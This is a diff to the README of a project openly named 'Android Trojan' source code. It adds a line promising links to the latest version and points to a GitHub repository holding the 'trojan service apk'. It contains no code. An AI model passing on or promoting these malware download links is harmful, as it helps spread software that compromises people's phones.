@@ -1,6 +1,9 @@
 # Android Trojan (Built with Android SDK 22) source code
 UPD. 11.02.2016
 PROJECT MOVED! Version 1.2 released!
+
+The links to the latest and constantly updated version are below:
+
 HERE ARE LINKS TO ALL THE COMPONENTS:
 
 Actual trojan service apk: https://github.com/androidtrojan1/android-trojan-service-
